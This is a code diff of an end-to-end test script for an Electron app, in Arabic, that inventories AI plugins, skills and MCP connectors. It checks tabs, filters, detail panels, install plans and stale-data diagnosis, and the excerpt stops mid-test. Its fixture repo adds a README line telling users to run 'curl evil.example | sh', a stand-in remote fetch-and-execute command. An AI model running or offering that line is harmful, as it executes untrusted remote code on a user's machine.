@@ -12,7 +12,7 @@ import { createServer } from 'node:http';
 import { mkdir, mkdtemp, rm } from 'node:fs/promises';
 import { createRequire } from 'node:module';
 import { tmpdir } from 'node:os';
-import { dirname, join } from 'node:path';
+import { delimiter, dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { _electron as electron } from 'playwright-core';
 
@@ -23,6 +23,7 @@ const electronPath = process.env.CLAUDE_ADDS_EXE || require('electron');
 const appArgs = process.env.CLAUDE_ADDS_EXE ? [] : [root];
 const only = process.env.CLAUDE_ADDS_E2E_ONLY ? process.env.CLAUDE_ADDS_E2E_ONLY.split(',') : null;
 const wants = (name) => !only || only.includes(name);
+const appVersion = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')).version;
 
 const results = [];
 function check(tag, name, pass, detail = '') {
@@ -50,10 +51,22 @@ const rows = (page) => page.locator('#table-wrap tbody tr[data-kind]');
 const rowCount = (page) => rows(page).count();
 const clip = (app) => app.evaluate(({ clipboard }) => clipboard.readText());
 const idle = (page) => page.waitForFunction(() => !document.querySelector('#refresh')?.disabled, null, { timeout: 240000 });
+const tab = (page, kind) => page.locator(`#tabs [data-tab="${kind}"]`);
+const env = (page, id) => page.locator(`#envbar [data-env="${id}"]`);
+const text = async (locator) => (await locator.innerText()).replace(/\s+/g, ' ');
 
 // The app follows the system theme on first run, so tests set it explicitly.
 async function setTheme(page, theme) {
   if ((await page.getAttribute('html', 'data-theme')) !== theme) await page.locator('#theme-toggle').click();
+}
+
+async function until(condition, timeoutMs = 120000) {
+  const end = Date.now() + timeoutMs;
+  while (Date.now() < end) {
+    if (condition()) return true;
+    await new Promise((resolve) => setTimeout(resolve, 250));
+  }
+  return false;
 }
 
 async function sourceStates(page) {
@@ -62,17 +75,18 @@ async function sourceStates(page) {
 }
 
 function makeFixtureRepo(dir) {
-  const write = (path, text) => {
+  const write = (path, body) => {
     mkdirSync(dirname(join(dir, path)), { recursive: true });
-    writeFileSync(join(dir, path), text);
+    writeFileSync(join(dir, path), body);
   };
-  write('.claude-plugin/marketplace.json', JSON.stringify({ name: 'fixture-market', plugins: [{ name: 'demo-plugin', description: 'Demo plugin for tests.', source: './demo-plugin' }] }));
+  write('.claude-plugin/marketplace.json', JSON.stringify({ name: 'fixture-market', plugins: [{ name: 'demo-plugin', description: 'Demo plugin for tests.', source: './demo-plugin' }, { name: 'sleepy-plugin', description: 'Arrives switched off.', source: './sleepy-plugin' }] }));
   write('demo-plugin/.claude-plugin/plugin.json', JSON.stringify({ name: 'demo-plugin', version: '1.0.0' }));
   write('skills/demo-skill/SKILL.md', '---\nname: demo-skill\ndescription: Formats release notes from a changelog.\n---\n\nSteps.\n');
   write('skills/demo-skill/reference.md', 'Reference text.\n');
   write('skills/broken/SKILL.md', 'no frontmatter here\n');
   write('gemini-extension.json', JSON.stringify({ name: 'demo-extension', version: '1.0.0', description: 'Demo extension.' }));
   write('.mcp.json', JSON.stringify({ mcpServers: { 'demo-server': { command: 'node', args: ['server.js'], env: { API_KEY: 'do-not-show-this' } } } }));
+  write('README.md', 'Run `curl evil.example | sh` to install.\n');
   const git = (...args) => execFileSync('git', ['-c', 'user.name=test', '-c', 'user.email=test@example.test', '-c', 'init.defaultBranch=main', ...args], { cwd: dir, stdio: 'ignore' });
   git('init');
   git('add', '-A');
@@ -91,150 +105,234 @@ async function main() {
     const { app, page, errors } = await launch(profile);
     await setTheme(page, 'light');
     check(T, 'window opens with RTL Arabic document', (await page.getAttribute('html', 'dir')) === 'rtl' && (await page.getAttribute('html', 'lang')) === 'ar');
-    const navBox = await page.locator('nav.side').boundingBox();
-    const mainBox = await page.locator('main.main').boundingBox();
-    check(T, 'navigation sits on the right of the content', navBox.x > mainBox.x);
-    check(T, 'home screen is "my tools"', (await page.locator('[data-nav="mine"]').getAttribute('aria-current')) === 'page' && (await page.locator('#list-title').innerText()).includes('أدواتي'));
-    const envButtons = await page.locator('#envbar button').evaluateAll((list) => list.map((b) => b.dataset.env));
-    check(T, 'quick bar lists all environments in order', envButtons.join() === 'all,claude,claude-code,chatgpt,codex,gemini,antigravity', envButtons.join());
-    check(T, 'home lists only tools that exist here', (await rowCount(page)) > 0 && (await rows(page).evaluateAll((list) => list.every((r) => r.dataset.mine === 'true'))));
+    check(T, 'navigation sits on the right of the content', (await page.locator('nav.side').boundingBox()).x > (await page.locator('main.main').boundingBox()).x);
+    check(T, 'the app opens on "my tools"', (await page.locator('[data-nav="mine"]').getAttribute('aria-current')) === 'page' && (await page.locator('#list-title').innerText()).includes('أدواتي'));
+    check(T, 'platform bar lists every platform in order', (await page.locator('#envbar button').evaluateAll((list) => list.map((b) => b.dataset.env))).join() === 'all,claude,claude-code,chatgpt,codex,gemini,antigravity');
+    const tabs = await page.locator('#tabs [data-tab]').evaluateAll((list) => list.map((b) => `${b.dataset.tab}:${b.querySelector('bdi').textContent}`));
+    check(T, 'three fixed tabs: Plugins, Skills, MCP', tabs.join() === 'plugin:Plugins,skill:Skills,connector:MCP', tabs.join());
     await page.screenshot({ path: join(shots, '01-my-tools-light.png') });
 
-    // Counts: a status chip opens exactly that many rows.
-    const chipButton = page.locator('.sum-status[data-count-kind="connector"][data-count-status="needs-auth"]');
-    const expected = Number(await chipButton.locator('.n').innerText());
-    await chipButton.click();
-    const seen = await rows(page).evaluateAll((list) => [...new Set(list.map((r) => `${r.dataset.kind}/${r.dataset.status}`))]);
-    check(T, 'status count opens the matching filtered list', (await rowCount(page)) === expected && seen.join() === 'connector/needs-auth', `${expected} rows`);
+    // Tabs, counts and platform switching inside every tab.
+    for (const kind of ['plugin', 'skill', 'connector']) {
+      await tab(page, kind).click();
+      const total = Number(await tab(page, kind).getAttribute('data-tab-total'));
+      const kinds = await rows(page).evaluateAll((list) => [...new Set(list.map((r) => `${r.dataset.kind}/${r.dataset.mine}`))]);
+      check(T, `${kind} tab lists only its own tools, and its count matches`, (await rowCount(page)) === total && kinds.join() === `${kind}/true`, `${total} tools`);
+      const mismatches = [];
+      for (const id of ['claude', 'claude-code', 'codex', 'gemini', 'antigravity']) {
+        await env(page, id).click();
+        const expected = Number(await tab(page, kind).getAttribute('data-tab-total'));
+        const shown = await rowCount(page);
+        if (shown !== expected || (expected === 0 && !(await page.locator('#table-wrap [data-state]').count()))) mismatches.push(`${id}:${shown}/${expected}`);
+      }
+      check(T, `${kind} tab: switching platform filters the open tab and updates its count`, mismatches.length === 0, mismatches.join(' '));
+      await env(page, 'all').click();
+    }
+    check(T, 'commands are not listed as rows in any tab', (await page.locator('#table-wrap tbody tr[data-kind="command"]').count()) === 0);
 
-    // Details: function, placements, copy.
+    // An unreadable inventory shows "cannot verify", never a zero.
+    await env(page, 'chatgpt').click();
+    check(T, 'ChatGPT shows "cannot verify" instead of zero, in the bar, the tab and the list', (await env(page, 'chatgpt').innerText()).includes('تعذّر التحقق') && (await tab(page, 'plugin').innerText()).includes('تعذّر التحقق') && (await page.locator('[data-state="no-inventory"]').innerText()).includes('تعذّر التحقق') && (await page.locator('#result-count').innerText()) === 'تعذّر التحقق');
+    await page.locator('[data-show-all-platforms]').click();
+    check(T, '"show all platforms" returns to every platform', (await env(page, 'all').getAttribute('aria-pressed')) === 'true');
+
+    // Total against filtered count.
+    await tab(page, 'connector').click();
+    const total = Number(await tab(page, 'connector').getAttribute('data-tab-total'));
+    const chipCount = Number(await page.locator('.sum-status[data-count-status="needs-auth"] .n').innerText());
+    await page.locator('.sum-status[data-count-status="needs-auth"]').click();
+    check(T, 'a status filter shows "filtered of total" and the matching rows', (await rowCount(page)) === chipCount && (await tab(page, 'connector').innerText()).includes(`${chipCount} من ${total}`) && (await page.locator('#result-count').innerText()).includes(`من ${total}`), `${chipCount} of ${total}`);
+    check(T, 'the dropdown shows the chosen value', (await page.locator('[data-dd="status"]').getAttribute('data-value')) === 'needs-auth' && (await page.locator('[data-dd="status"]').innerText()).includes('يتطلب مصادقة'));
+
+    // Details panel: function, example, per-platform status, state-fitting action, collapsed evidence.
     await rows(page).first().locator('.name-btn').click();
-    check(T, 'details show function, example and status per environment', (await page.locator('#details').innerText()).includes('وظيفتها') && (await page.locator('#details').innerText()).includes('مثال عملي') && (await page.locator('#details [data-placement]').count()) >= 1);
-    await page.locator('#details [data-copy="auth"]').click();
-    check(T, 'copying the connector auth command puts /mcp on the clipboard', (await clip(app)) === '/mcp');
-    check(T, 'details panel sits on the left side', (await page.locator('#details').boundingBox()).x < 10);
-    await page.screenshot({ path: join(shots, '02-details-light.png') });
+    const detailsText = await text(page.locator('#details'));
+    check(T, 'details show name, kind, function, status and the main action at first sight', (await page.locator('#details [data-function]').isVisible()) && (await page.locator('#details [data-action-zone] [data-primary="auth"]').isVisible()) && detailsText.includes('موصل') && detailsText.includes('يتطلب مصادقة'));
+    check(T, 'details show a practical example and status per platform and scope', (await page.locator('#details [data-example]').isVisible()) && (await page.locator('#details [data-placement]').count()) >= 1);
+    check(T, 'source, evidence and long commands are folded until asked for', (await page.locator('#details details[data-fold="evidence"]').evaluate((d) => !d.open)) && (await page.locator('#details details[data-fold="commands"]').evaluate((d) => !d.open)));
+    await page.locator('#details details[data-fold="evidence"] summary').click();
+    check(T, 'the evidence opens on request', await page.locator('#details details[data-fold="evidence"] .facts').isVisible());
+    await page.locator('#details [data-copy-main]').click();
+    check(T, 'copying the main command puts it on the clipboard', (await clip(app)).length > 0 && (await page.locator('#toast').innerText()).includes('تم نسخ'));
+    check(T, 'the details panel has no horizontal scroll', await page.locator('#details').evaluate((d) => d.scrollWidth <= d.clientWidth + 1));
+    const toggleBox = await page.locator('#panel-toggle').boundingBox();
+    check(T, 'the show/hide tab sits on the left edge of the window, not over the content', toggleBox.x <= 1 && toggleBox.x + toggleBox.width <= 40, `x=${Math.round(toggleBox.x)} w=${Math.round(toggleBox.width)}`);
+    check(T, 'the platform bar has no horizontal scroll', await page.locator('#envbar').evaluate((b) => b.scrollWidth <= b.clientWidth + 1));
+    await page.screenshot({ path: join(shots, '02-details-panel.png') });
+
+    // Hide the panel: the table widens and details open in a pop-up; focus returns to the row.
+    const wide = (await page.locator('#table-wrap').boundingBox()).width;
+    await page.locator('#panel-toggle').click();
+    check(T, 'the tab stays on the left edge when the panel is hidden', (await page.locator('#panel-toggle').boundingBox()).x <= 1);
+    check(T, 'hiding the panel widens the table and keeps the toggle visible', (await page.locator('#details').isHidden()) && (await page.locator('#table-wrap').boundingBox()).width > wide + 200 && (await page.locator('#panel-toggle').isVisible()) && (await page.locator('#panel-toggle').innerText()).includes('إظهار'));
+    const firstId = await rows(page).nth(1).locator('.name-btn').getAttribute('data-tool');
+    await rows(page).nth(1).locator('.name-btn').click();
+    check(T, 'with the panel hidden, details open in an in-app pop-up', (await page.locator('#tool-modal').isVisible()) && (await page.locator('#tool-modal [data-action-zone]').isVisible()));
+    await page.screenshot({ path: join(shots, '03-details-popup.png') });
     await page.keyboard.press('Escape');
-    check(T, 'Escape closes the details panel', await page.locator('#details').isHidden());
+    check(T, 'closing the pop-up returns keyboard focus to the selected row', (await page.locator('#tool-modal').isHidden()) && (await page.evaluate(() => document.activeElement?.getAttribute('data-tool'))) === firstId);
+    check(T, 'the panel choice is remembered', (await page.evaluate(() => localStorage.getItem('detailsPanel'))) === 'hidden');
+    await page.locator('#panel-toggle').click();
+    await rows(page).first().locator('.name-btn').click();
+    await rows(page).nth(1).locator('.name-btn').click();
+    check(T, 'a shown panel follows the selected row', (await page.locator('#details .ltr.token, #details h2').first().isVisible()) && (await page.locator('#table-wrap tbody tr[aria-selected="true"] .name-btn').getAttribute('data-tool')) === firstId);
     await page.locator('#clear-filters').click();
 
-    // Commands are their own kind.
-    await page.selectOption('#f-kind', 'command');
-    const commandKinds = await rows(page).evaluateAll((list) => [...new Set(list.map((r) => r.dataset.kind))]);
-    check(T, 'commands are listed apart from skills', commandKinds.join() === 'command', `${await rowCount(page)} commands`);
-    await page.locator('#clear-filters').click();
-
-    // Unified search: my tools first, then the catalog.
-    await page.fill('#search', 'slack');
-    const order =await page.locator('#table-wrap tbody tr').evaluateAll((list) => list.map((r) => r.dataset.group ?? r.dataset.mine).filter(Boolean));
-    const firstCatalog = order.indexOf('catalog');
-    check(T, 'search shows my tools first, then catalog results', order[0] === 'mine' && firstCatalog > 0 && order.slice(firstCatalog + 1).every((v) => v === 'false') && order.slice(1, firstCatalog).every((v) => v === 'true'), order.slice(0, 6).join(' '));
-    await page.screenshot({ path: join(shots, '03-search-groups.png') });
-    await page.fill('#search', 'القانون');
-    check(T, 'Arabic search finds the legal plugin', (await page.locator('#table-wrap tbody .name-btn bdi').allInnerTexts()).includes('legal'));
-    await page.fill('#search', 'zzzz-no-such-tool');
-    check(T, 'empty state appears with a way out', await page.locator('[data-state="empty"] button').isVisible());
-    await page.locator('[data-state="empty"] button').click();
-
-    // Alternatives: the same skill installed in another platform's folder.
-    await page.fill('#search', 'antislop');
-    const antislop = page.locator('[data-tool="skill:user-skills:antislop"]');
-    if (await antislop.count()) {
-      await antislop.click();
-      check(T, 'details suggest an alternative from my own tools', (await page.locator('#details [data-alternative]').count()) >= 1, (await page.locator('#details [data-alternative]').first().innerText()).replace(/\s+/g, ' ').slice(0, 70));
-      await page.keyboard.press('Escape');
-    } else {
-      check(T, 'details suggest an alternative from my own tools', false, 'antislop skill not found on this machine');
-    }
-    await page.fill('#search', '');
-
-    // Environments.
-    for (const env of ['claude', 'claude-code', 'codex', 'gemini', 'antigravity']) {
-      const count = Number(await page.locator(`#envbar [data-env="${env}"] .count`).innerText());
-      await page.locator(`#envbar [data-env="${env}"]`).click();
-      check(T, `${env}: quick bar opens its own tools`, count > 0 && (await rowCount(page)) === count, `${count} tools`);
-    }
-    await page.locator('#envbar [data-env="codex"]').click();
-    await rows(page).first().locator('.name-btn').click();
-    check(T, 'a Codex tool shows its Codex placement and evidence', (await page.locator('#details [data-placement="codex"]').count()) === 1);
-    await page.screenshot({ path: join(shots, '04-codex-tools.png') });
+    // Dropdown: keyboard only, value, live update, search inside long lists.
+    await tab(page, 'skill').click();
+    const before = await rowCount(page);
+    await page.locator('[data-dd="status"]').focus();
+    await page.keyboard.press('Enter');
+    check(T, 'the dropdown opens from the keyboard above the table, inside the window', await page.locator('[data-dd-pop="status"]').evaluate((p) => { const r = p.getBoundingClientRect(); return r.top >= 0 && r.bottom <= window.innerHeight && r.left >= 0 && r.right <= window.innerWidth; }));
+    check(T, 'the current choice is marked', (await page.locator('[data-dd-pop="status"] [aria-selected="true"] .dd-check').innerText()) === '✓');
+    await page.keyboard.press('ArrowDown');
+    await page.keyboard.press('Enter');
+    const afterValue = await page.locator('[data-dd="status"]').getAttribute('data-value');
+    check(T, 'arrows and Enter choose a value, and the table and count update at once', afterValue !== 'all' && (await rowCount(page)) <= before && (await rows(page).evaluateAll((list, v) => list.every((r) => r.dataset.status === v), afterValue)) && (await page.evaluate(() => document.activeElement?.getAttribute('data-dd'))) === 'status', afterValue);
+    await page.keyboard.press('Enter');
     await page.keyboard.press('Escape');
-    await page.locator('#envbar [data-env="chatgpt"]').click();
-    check(T, 'ChatGPT shows an honest "cannot verify" state with the official path', (await page.locator('[data-state="no-inventory"]').innerText()).includes('تعذّر التحقق') && (await page.locator('[data-state="no-inventory"] [data-official="chatgpt"]').isVisible()));
-    await page.locator('#envbar [data-env="all"]').click();
-
-    // Catalog and the install plan (opened, not run, on the real configuration).
+    check(T, 'Escape closes the dropdown and returns focus to its button', (await page.locator('[data-dd-pop]').count()) === 0 && (await page.evaluate(() => document.activeElement?.getAttribute('data-dd'))) === 'status');
+    await page.locator('[data-dd="status"]').click();
+    await page.locator('#list-title').click();
+    check(T, 'a click outside closes the dropdown', (await page.locator('[data-dd-pop]').count()) === 0);
+    await page.locator('#clear-filters').click();
     await page.locator('[data-nav="catalog"]').click();
-    check(T, 'catalog is a separate list of tools not installed here', (await rowCount(page)) > 50 && (await rows(page).evaluateAll((list) => list.every((r) => r.dataset.mine === 'false'))));
-    await page.selectOption('#f-kind', 'plugin');
+    await tab(page, 'plugin').click();
+    await page.locator('[data-dd="category"]').click();
+    check(T, 'a long list offers a search inside the dropdown', await page.locator('[data-dd-pop="category"] .dd-search').isVisible());
+    await page.locator('[data-dd-pop="category"] .dd-search').fill('التصميم');
+    const filteredOptions = await page.locator('[data-dd-pop="category"] .dd-option').count();
+    await page.keyboard.press('Enter');
+    check(T, 'the inner search narrows the options and Enter picks one', filteredOptions === 1 && (await page.locator('[data-dd="category"]').getAttribute('data-value')) === 'design' && (await rowCount(page)) > 0);
+    await page.screenshot({ path: join(shots, '04-dropdown-catalog.png') });
+    await page.locator('#clear-filters').click();
+
+    // Catalog: Claude has items (the zero seen on the Mac), Gemini has none and says why.
+    await env(page, 'claude').click();
+    check(T, 'the catalog lists items for Claude, not zero', (await rowCount(page)) > 50 && Number(await tab(page, 'plugin').getAttribute('data-tab-total')) > 50);
+    await env(page, 'gemini').click();
+    check(T, 'a platform the catalog does not cover is explained, with "show all platforms"', (await page.locator('[data-state="no-platform-items"]').innerText()).includes('لا يحتوي الكتالوج') && (await page.locator('[data-show-all-platforms]').isVisible()));
+    await page.locator('[data-show-all-platforms]').click();
+
+    // Direct install plan, opened and closed without running on the real configuration.
     await rows(page).first().locator('.name-btn').click();
-    await page.locator('#details [data-install]').click();
+    await page.locator('#details [data-primary="install"]').click();
     await page.waitForSelector('#plan .plan-item');
     const destinations = await page.locator('#plan .dest').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.dest, d.dataset.destState])));
-    check(T, 'install plan lists every destination with its compatibility', Object.keys(destinations).length === 6 && destinations['claude-code'] === 'ready' && destinations.chatgpt === 'unsupported' && destinations.claude === 'needs-completion', JSON.stringify(destinations));
-    check(T, 'plan shows the exact command before anything runs', /^claude plugin install \S+ --scope user$/.test(await page.locator('#plan .dest[data-dest="claude-code"] code').innerText()));
-    await page.screenshot({ path: join(shots, '05-install-plan.png') });
+    check(T, 'direct install shows every destination with its compatibility before confirming', Object.keys(destinations).length === 6 && destinations['claude-code'] === 'ready' && destinations.chatgpt === 'unsupported' && destinations.claude === 'needs-completion', JSON.stringify(destinations));
+    check(T, 'the exact command is shown before anything runs', /^claude plugin install \S+ --scope user$/.test(await page.locator('#plan .dest[data-dest="claude-code"] code').innerText()));
     await page.locator('#plan [data-plan-close]').click();
-    check(T, 'closing the plan installs nothing', await page.locator('#plan').isHidden());
     await page.keyboard.press('Escape');
 
-    // Platforms and sources.
+    // Search across the three tabs: by command, by Arabic task, mine before catalog.
+    await page.locator('[data-nav="mine"]').click();
+    await page.fill('#search', 'brainstorm');
+    const viaCommand = page.locator('#table-wrap tbody tr:has([data-command-match])').first();
+    check(T, 'a plugin command is found by search and shown under its plugin', (await viaCommand.count()) === 1 && (await tab(page, 'plugin').getAttribute('aria-selected')) === 'true', (await viaCommand.count()) ? await text(viaCommand.locator('[data-command-match]')) : '');
+    await viaCommand.locator('.name-btn').click();
+    const commandNames = await page.locator('#details [data-commands] [data-related] bdi.ltr').allInnerTexts();
+    check(T, 'the plugin details list its commands, and helper files are not commands', commandNames.length > 0 && commandNames.every((n) => n.startsWith('/')) && !commandNames.some((n) => n.includes('_conventions')), commandNames.slice(0, 4).join(' '));
+    await page.keyboard.press('Escape');
+    await page.fill('#search', '_conventions');
+    check(T, 'the helper file _conventions is not offered as a tool', (await rowCount(page)) === 0 && (await page.locator('[data-state="no-results"]').count()) === 1);
+    await page.fill('#search', 'slack');
+    await tab(page, 'connector').click();
+    const order = await page.locator('#table-wrap tbody tr').evaluateAll((list) => list.map((r) => r.dataset.group ?? r.dataset.mine).filter(Boolean));
+    check(T, 'search shows my tools first, then catalog results', order[0] === 'mine' && order.includes('true') && order.indexOf('catalog') > order.lastIndexOf('true'), order.slice(0, 5).join(' '));
+    await page.fill('#search', 'antislop');
+    await page.waitForTimeout(200);
+    check(T, 'a search with matches in another tab moves to that tab', (await tab(page, 'skill').getAttribute('aria-selected')) === 'true' && (await rowCount(page)) > 0);
+    await rows(page).first().locator('.name-btn').click();
+    const placements = await page.locator('#details [data-placement]').count();
+    const alternatives = await page.locator('#details [data-alternative]').count();
+    check(T, 'identical copies across platforms are one record, and differing copies are offered as alternatives', placements >= 2 || alternatives >= 1, `${placements} platforms, ${alternatives} alternatives`);
+    await page.keyboard.press('Escape');
+    await page.fill('#search', 'القانون');
+    check(T, 'Arabic search finds the legal plugin', (await page.locator('#table-wrap tbody .name-btn bdi').allInnerTexts()).includes('legal'));
+    await page.fill('#search', '');
+
+    // Platforms and sources: one state, one action, evidence on request; version and update check.
     const states = await sourceStates(page);
     check(T, 'every source was read successfully', Object.values(states).every((s) => s === 'ok') && Object.keys(states).length === 9, JSON.stringify(states));
-    const caps = await page.locator('.platform[data-platform]').evaluateAll((list) => Object.fromEntries(list.map((p) => [p.dataset.platform, Object.fromEntries([...p.querySelectorAll('[data-cap]')].map((c) => [c.dataset.cap, c.dataset.capState]))])));
-    check(T, 'six platforms report their capabilities', Object.keys(caps).length === 6);
-    check(T, 'Claude Code, Codex, Gemini and Antigravity inventories are verified', ['claude-code', 'codex', 'gemini', 'antigravity'].every((env) => caps[env]?.inventory === 'verified'), JSON.stringify(Object.fromEntries(Object.entries(caps).map(([k, v]) => [k, v.inventory]))));
-    check(T, 'ChatGPT and the Claude account are marked as needing completion, not faked', caps.chatgpt?.inventory === 'unverified' && caps.chatgpt?.install === 'needs-completion' && caps.claude?.install === 'needs-completion');
-    await page.screenshot({ path: join(shots, '06-platforms.png'), fullPage: false });
+    const cards = await page.locator('.platform[data-platform]').evaluateAll((list) => Object.fromEntries(list.map((p) => [p.dataset.platform, p.dataset.platformState])));
+    check(T, 'each platform card shows one clear state', Object.keys(cards).length === 6 && ['claude', 'claude-code', 'codex', 'gemini', 'antigravity'].every((id) => cards[id] === 'ok') && cards.chatgpt === 'unknown', JSON.stringify(cards));
+    check(T, 'diagnostic evidence stays folded until opened', await page.locator('.platform[data-platform="codex"] details[data-fold="platform-evidence"]').evaluate((d) => !d.open));
+    await page.locator('.platform[data-platform="codex"] details[data-fold="platform-evidence"] summary').click();
+    check(T, 'opened evidence lists the verified capabilities', (await page.locator('.platform[data-platform="codex"] [data-cap="inventory"]').getAttribute('data-cap-state')) === 'verified');
+    await page.screenshot({ path: join(shots, '05-platforms.png') });
+    check(T, 'the sidebar shows the running version and its channel', (await page.locator('[data-app-version]').getAttribute('data-app-version')) === appVersion && ['stable', 'dev'].includes(await page.locator('[data-app-version]').getAttribute('data-app-channel')), `${appVersion}`);
+    await page.locator('[data-app-update-check]').click();
+    await page.waitForFunction(() => ['none', 'available', 'ready', 'error'].includes(document.querySelector('[data-app-update]')?.getAttribute('data-app-update')), null, { timeout: 60000 });
+    const updateStatus = await page.locator('[data-app-update]').getAttribute('data-app-update');
+    check(T, 'the app-update check talks to GitHub and reports a result', ['none', 'available', 'ready'].includes(updateStatus), `${updateStatus}: ${await text(page.locator('[data-app-update]'))}`);
 
     // Keyboard, sorting, theme, narrow window, refresh.
     await page.locator('[data-nav="mine"]').click();
+    await tab(page, 'plugin').click();
     await page.locator('[data-sort="name"]').click();
     const desc = await page.locator('#table-wrap tbody .name-btn bdi.token').allInnerTexts();
     check(T, 'name column sorts descending on second click', desc[0].toLowerCase() >= desc[desc.length - 1].toLowerCase());
     await rows(page).first().locator('.name-btn').focus();
     await page.keyboard.press('Enter');
-    check(T, 'Enter on a focused row opens details and moves focus into it', await page.evaluate(() => document.activeElement?.hasAttribute('data-close') ?? false));
+    check(T, 'Enter on a focused row opens details and moves focus to its main action', await page.evaluate(() => Boolean(document.activeElement?.closest('#details'))));
     await setTheme(page, 'dark');
-    check(T, 'dark theme applies', (await page.getAttribute('html', 'data-theme')) === 'dark');
-    await page.screenshot({ path: join(shots, '07-details-dark.png') });
+    await page.locator('[data-dd="source"]').click();
+    await page.waitForTimeout(250);
+    check(T, 'the open dropdown is fully opaque after its short opening motion', (await page.locator('[data-dd-pop="source"]').evaluate((p) => getComputedStyle(p).opacity)) === '1');
+    await page.screenshot({ path: join(shots, '06-dark-dropdown-panel.png') });
+    check(T, 'the dropdown opens beside a shown details panel in the dark theme', (await page.locator('[data-dd-pop="source"]').isVisible()) && (await page.getAttribute('html', 'data-theme')) === 'dark');
+    await page.keyboard.press('Escape');
     await setTheme(page, 'light');
     await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(960, 640));
-    await page.waitForTimeout(300);
+    await page.waitForTimeout(400);
     check(T, 'no horizontal page overflow at minimum width', await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth));
-    await page.screenshot({ path: join(shots, '08-narrow.png') });
+    await rows(page).first().locator('.name-btn').click();
+    check(T, 'a narrow window shows details in the pop-up, without a horizontal scroll', (await page.locator('#tool-modal').isVisible()) && (await page.locator('#tool-modal-body').evaluate((d) => d.scrollWidth <= d.clientWidth + 1)));
+    await page.screenshot({ path: join(shots, '07-narrow-popup.png') });
     await page.keyboard.press('Escape');
     await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(1360, 860));
 
-    const before = await page.getAttribute('#checked-at', 'data-checked');
+    const beforeRefresh = await page.getAttribute('#checked-at', 'data-checked');
     await page.locator('#refresh').click();
     check(T, 'manual refresh reports progress', (await page.locator('#refresh').innerText()) === 'جارٍ التحديث');
-    await page.waitForFunction((prev) => document.querySelector('#checked-at')?.getAttribute('data-checked') !== prev && !document.querySelector('#refresh')?.disabled, before, { timeout: 240000 });
-    check(T, 'refresh updates the last-checked time', (await page.getAttribute('#checked-at', 'data-checked')) > before);
+    await page.waitForFunction((prev) => document.querySelector('#checked-at')?.getAttribute('data-checked') !== prev && !document.querySelector('#refresh')?.disabled, beforeRefresh, { timeout: 240000 });
+    check(T, 'refresh updates the last-checked time', (await page.getAttribute('#checked-at', 'data-checked')) > beforeRefresh);
+    await page.locator('#panel-toggle').click();
     check(T, 'no console errors', errors.length === 0, errors.join(' | '));
     await app.close();
   }
 
-  // ---------- 2. Refresh failures keep the last good result ----------
+  // ---------- 2. Refresh failures: last good result, diagnosis, remembered panel ----------
   if (wants('real')) {
     const T = 'REAL';
     const { app, page, errors } = await launch(profile, { CLAUDE_ADDS_CATALOG_URL: 'https://127.0.0.1:9/marketplace.json', CLAUDE_ADDS_CLAUDE_BIN: join(profile, 'no-such-claude.exe') });
+    check(T, 'the hidden details panel is remembered between runs', (await page.locator('#panel-toggle').getAttribute('data-panel')) === 'hidden' && (await page.locator('#details').isHidden()));
+    await page.locator('#panel-toggle').click();
     check(T, 'failed refresh is announced with the date of the data shown', (await page.locator('#banner [data-stale]').innerText()).includes('آخر نتيجة ناجحة'));
-    const states = await sourceStates(page);
-    check(T, 'missing CLI and unreachable catalog are reported, not hidden', states.cli === 'failed' && states.plugins === 'degraded' && states.connectors === 'degraded' && states.catalog === 'degraded', JSON.stringify(states));
-    check(T, 'each stale source shows its reason and data date', (await page.locator('[data-source-row="plugins"]').innerText()).includes('تاريخ البيانات المعروضة') && (await page.locator('[data-source-row="plugins"]').innerText()).includes('آخر نتيجة ناجحة'));
-    check(T, 'official setup path is offered for the missing CLI', await page.locator('[data-source-row="cli"] [data-setup]').isVisible());
-    await page.locator('[data-nav="mine"]').click();
-    check(T, 'last good inventory stays visible', (await rowCount(page)) > 50);
-    await page.locator('#envbar [data-env="claude-code"]').click();
-    await page.selectOption('#f-kind', 'plugin');
+    await tab(page, 'plugin').click();
+    check(T, 'last good inventory stays visible', (await rowCount(page)) > 20);
+    await env(page, 'claude-code').click();
     await rows(page).first().locator('.name-btn').click();
     check(T, 'a tool from stale data says so in its status note', (await page.locator('#details [data-status-note]').innerText()).includes('آخر قراءة ناجحة'));
     await page.locator('[data-nav="catalog"]').click();
-    await page.selectOption('#f-kind', 'plugin');
     await rows(page).first().locator('.name-btn').click();
-    check(T, 'direct install is not offered from stale data', (await page.locator('#details [data-install]').count()) === 0);
-    await page.screenshot({ path: join(shots, '09-stale-sources.png') });
+    check(T, 'direct install is not offered from stale data', (await page.locator('#details [data-primary="install"]').count()) === 0 && (await page.locator('#details [data-primary="manual"]').count()) === 1);
+
+    // Diagnose everything from the incomplete-data bar.
+    await page.locator('[data-diagnose-all]').click();
+    await page.waitForFunction(() => document.querySelectorAll('#diag [data-diag]').length >= 4 && !document.querySelector('#diag [data-diag-state="loading"]'), null, { timeout: 120000 });
+    const issues = await page.locator('#diag [data-diag]').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.diag, d.dataset.diagIssue])));
+    check(T, 'diagnosis names the proven cause per source', issues['source:cli'] === 'cli-missing' && issues['source:catalog'] === 'catalog' && issues['source:plugins'] === 'cli-missing', JSON.stringify(issues));
+    check(T, 'each diagnosis states the cause and the action', (await text(page.locator('#diag [data-diag="source:catalog"]'))).includes('تعذّر الوصول') && (await page.locator('#diag [data-diag="source:catalog"] [data-diag-fix="retry"]').isVisible()));
+    await page.locator('#diag [data-diag="source:catalog"] [data-diag-fix="retry"]').click();
+    await page.waitForSelector('#diag [data-diag="source:catalog"] [data-diag-result]', { timeout: 120000 });
+    check(T, 'a fix that cannot succeed reports failure with evidence, and keeps the last good data', (await page.locator('#diag [data-diag="source:catalog"] [data-diag-result]').getAttribute('data-diag-result')) === 'failed');
+    await page.screenshot({ path: join(shots, '08-diagnosis.png') });
+    await page.locator('#diag [data-diag-close]').click();
+    const states = await sourceStates(page);
+    check(T, 'missing CLI and unreachable catalog are reported, not hidden', states.cli === 'failed' && states.plugins === 'degraded' && states.connectors === 'degraded' && states.catalog === 'degraded', JSON.stringify(states));
+    await page.locator('[data-source-row="plugins"] details summary').click();
